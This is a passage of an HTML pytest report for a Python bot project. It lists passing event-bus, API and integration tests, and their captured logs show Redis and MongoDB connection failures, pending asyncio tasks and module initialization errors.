            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:353 Redis connection attempt 1 failed: Connection failed
WARNING  src.events.bus:bus.py:353 Redis connection attempt 2 failed: Connection failed
WARNING  src.events.bus:bus.py:353 Redis connection attempt 3 failed: Connection failed
ERROR    src.events.bus:bus.py:364 Max retries exceeded for Redis connection<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_connect_with_retry</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log setup------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-119&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:353 Redis connection attempt 1 failed: Connection failed<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_publish_success_with_redis</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_publish_success_with_local_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_publish_local_queue_full</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:691 Local queue is full, dropping oldest event<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_subscribe_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_subscribe_multiple_handlers</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-117&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-121&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_health_check_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_health_check_redis_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:870 Redis health check failed: Redis error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_process_local_queue_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_process_local_queue_partial_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:741 Failed to process queued event: Redis error
WARNING  src.events.bus:bus.py:753 Failed to process 1 events from local queue<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_queue_locally_persistence</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::test_event_bus_with_real_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::test_create_event_bus</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_health_check_endpoint</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_api_info_endpoint</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_state_success</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_state_not_found</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.api.endpoints.users:users.py:114 User not found when getting state<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_state_unauthorized</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:312 Error retrieving user profile from SQLite: SQLite is not connected
WARNING  src.api.endpoints.users:users.py:114 User not found when getting state<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_update_user_preferences_success</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_update_user_preferences_failure</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.api.endpoints.users:users.py:202 Failed to update user preferences
ERROR    src.api.endpoints.users:users.py:213 Error updating user preferences<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_update_user_preferences_unauthorized</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:387 Error updating user state: MongoDB is not connected
WARNING  src.api.endpoints.users:users.py:202 Failed to update user preferences
ERROR    src.api.endpoints.users:users.py:213 Error updating user preferences<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_subscription_success</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_subscription_not_found</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.api.endpoints.users:users.py:295 User not found when getting subscription<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_user_subscription_unauthorized</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:312 Error retrieving user profile from SQLite: SQLite is not connected
WARNING  src.api.endpoints.users:users.py:295 User not found when getting subscription<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_user_router_prefix_and_tags</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_webhook_mode_integration</td>
          <td class="col-duration">40.17</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf351688ed7674ef4ee932, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf351c88ed7674ef4ee933, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf352388ed7674ef4ee934, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf352c88ed7674ef4ee935, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf353988ed7674ef4ee936, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_command_routing_integration</td>
          <td class="col-duration">40.17</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf353e88ed7674ef4ee937, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf354488ed7674ef4ee938, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf354b88ed7674ef4ee939, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf355588ed7674ef4ee93a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-216&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-217&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf356288ed7674ef4ee93b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_error_handling_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.utils.errors:errors.py:125 Error occurred: Config error
ERROR    src.core.application:application.py:144 Failed to start bot application: An unexpected error occurred. Please try again or contact support.<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_middleware_pipeline_integration</td>
          <td class="col-duration">40.16</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf356788ed7674ef4ee93c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf356d88ed7674ef4ee93d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf357488ed7674ef4ee93e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf357d88ed7674ef4ee93f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf358a88ed7674ef4ee940, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_configuration_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_concurrent_request_handling</td>
          <td class="col-duration">40.16</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf358f88ed7674ef4ee941, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf359588ed7674ef4ee942, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf359c88ed7674ef4ee943, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35a588ed7674ef4ee944, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-223&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-224&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35b288ed7674ef4ee945, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_security_pipeline_integration</td>
          <td class="col-duration">40.15</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35b788ed7674ef4ee946, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
